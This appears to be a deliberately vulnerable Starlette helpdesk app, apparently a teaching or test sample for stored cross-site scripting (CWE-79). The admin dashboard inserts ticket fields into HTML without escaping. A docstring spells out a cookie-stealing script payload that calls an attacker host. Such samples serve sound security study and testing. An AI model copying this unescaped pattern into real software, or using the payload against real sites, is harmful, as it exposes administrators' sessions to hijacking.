import sys
import logging
from datetime import datetime
import uvicorn
from starlette.applications import Starlette
from starlette.responses import HTMLResponse, RedirectResponse
from starlette.routing import Route
from starlette.requests import Request

# Configure logging for the Helpdesk Service
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    stream=sys.stdout
)
logger = logging.getLogger("HelpdeskApp")

# In-memory database representing persistent storage for support tickets
TICKET_DB = [
    {
        "id": 101, 
        "email": "alice@example.com", 
        "subject": "Billing issue", 
        "description": "I was charged twice for my subscription this month.",
        "created_at": "2023-11-20T10:00:00"
    },
    {
        "id": 102, 
        "email": "bob@example.com", 
        "subject": "Unable to access portal", 
        "description": "The login page keeps redirecting me in a loop.",
        "created_at": "2023-11-20T11:15:30"
    }
]

async def index(request: Request):
    """Renders the customer-facing ticket submission form."""
    logger.info("Serving ticket submission form.")
    html_form = """
    <!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8">
        <title>Submit Support Ticket</title>
        <style>
            body { font-family: Arial, sans-serif; background: #f0f2f5; padding: 40px; }
            .form-container { background: white; max-width: 500px; margin: 0 auto; padding: 30px; border-radius: 8px; box-shadow: 0 4px 12px rgba(0,0,0,0.1); }
            h2 { color: #1a73e8; margin-top: 0; }
            label { font-weight: bold; margin-top: 15px; display: block; color: #5f6368; }
            input[type="text"], input[type="email"], textarea { width: 100%; padding: 10px; margin-top: 5px; border: 1px solid #ccc; border-radius: 4px; box-sizing: border-box; }
            button { background: #1a73e8; color: white; border: none; padding: 12px 20px; margin-top: 20px; border-radius: 4px; cursor: pointer; width: 100%; font-size: 16px; }
            button:hover { background: #1557b0; }
        </style>
    </head>
    <body>
        <div class="form-container">
            <h2>Contact Support</h2>
            <form action="/api/submit-ticket" method="post">
                <label for="email">Email Address</label>
                <input type="email" id="email" name="email" required>
                
                <label for="subject">Issue Subject</label>
                <input type="text" id="subject" name="subject" required>
                
                <label for="description">Detailed Description</label>
                <textarea id="description" name="description" rows="5" required></textarea>
                
                <button type="submit">Submit Ticket</button>
            </form>
        </div>
    </body>
    </html>
    """
    return HTMLResponse(html_form)

async def create_ticket(request: Request):
    """API endpoint to receive form submissions and store them in the database."""
    form_data = await request.form()
    
    # Extract unvalidated input from the POST request
    new_ticket = {
        "id": 100 + len(TICKET_DB) + 1,
        "email": form_data.get("email", "unknown@example.com"),
        "subject": form_data.get("subject", "No Subject"),
        "description": form_data.get("description", "No Description"),
        "created_at": datetime.now().isoformat()
    }
    
    # Store the ticket in the mock database
    logger.info(f"New ticket created by {new_ticket['email']} with ID: {new_ticket['id']}")
    TICKET_DB.append(new_ticket)
    
    return RedirectResponse(url="/admin/dashboard", status_code=303)

async def admin_dashboard(request: Request):
    """
    VULNERABLE FUNCTION: CWE-79 Cross-Site Scripting (XSS)
    Context: Stored XSS via Database Content rendered in an Admin Dashboard.
    
    This function retrieves all support tickets from the database and renders them
    in an HTML table for administrative review. It directly concatenates the 
    'subject' and 'description' fields from the stored database records into 
    the HTML response without employing HTML entity encoding.
    
    Trigger Path:
    1. An attacker visits the public submission form (/) and submits a ticket.
    2. In the 'description' field, they enter a malicious payload:
       <script>fetch('http://attacker.com/steal?c='+document.cookie)</script>
    3. The application stores this payload in TICKET_DB.
    4. When a support agent or admin logs in and visits the /admin/dashboard route,
       this function reads the malicious payload from the database and reflects it
       into the DOM. The script executes in the agent's highly privileged session.
    """
    logger.info("Admin dashboard accessed.")
    
    # VULNERABLE SINK: Iterating over stored data and directly embedding untrusted 
    # properties (ticket['subject'] and ticket['description']) into the HTML string.
    html_content = f"""
    <!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8">
        <title>Helpdesk Admin Dashboard</title>
        <style>
            body {{ font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background: #eef2f5; padding: 30px; margin: 0; }}
            .dashboard {{ background: white; padding: 30px; border-radius: 8px; box-shadow: 0 4px 20px rgba(0,0,0,0.05); }}
            h1 {{ color: #2c3e50; border-bottom: 2px solid #34495e; padding-bottom: 10px; margin-top: 0; }}
            table {{ width: 100%; border-collapse: collapse; margin-top: 20px; }}
            th, td {{ padding: 15px; text-align: left; border-bottom: 1px solid #ecf0f1; }}
            th {{ background-color: #34495e; color: white; }}
            tr:hover {{ background-color: #f9f9f9; }}
            .desc {{ color: #7f8c8d; font-size: 0.95em; word-wrap: break-word; max-width: 400px; }}
            .status-badge {{ background: #e74c3c; color: white; padding: 4px 8px; border-radius: 4px; font-size: 0.8em; font-weight: bold; }}
        </style>
    </head>
    <body>
        <div class="dashboard">
            <h1>Active Support Tickets</h1>
            <p>Review and process incoming customer requests below.</p>
            <table>
                <tr>
                    <th>Ticket ID</th>
                    <th>Date Submitted</th>
                    <th>Customer Email</th>
                    <th>Subject</th>
                    <th>Issue Description</th>
                    <th>Action</th>
                </tr>
    """
    
    for ticket in TICKET_DB:
        html_content += f"""
                <tr>
                    <td>#{ticket['id']}</td>
                    <td>{ticket['created_at']}</td>
                    <td><a href="mailto:{ticket['email']}">{ticket['email']}</a></td>
                    
                    <!-- XSS Injection Point 1 -->
                    <td><strong>{ticket['subject']}</strong></td>
                    
                    <!-- XSS Injection Point 2 -->
                    <td class="desc">{ticket['description']}</td>
                    
                    <td><span class="status-badge">Requires Action</span></td>
                </tr>
        """
        
    html_content += """
            </table>
        </div>
    </body>
    </html>
    """
    
    return HTMLResponse(html_content)

# Starlette application routing configuration
app = Starlette(debug=True, routes=[
    Route('/', endpoint=index, methods=['GET']),
    Route('/api/submit-ticket', endpoint=create_ticket, methods=['POST']),
    Route('/admin/dashboard', endpoint=admin_dashboard, methods=['GET'])
])

if __name__ == "__main__":
    logger.info("Starting Starlette Helpdesk Service on port 8000...")
    # uvicorn is required to run the ASGI Starlette application
    uvicorn.run(app, host="0.0.0.0", port=8000, log_level="warning")
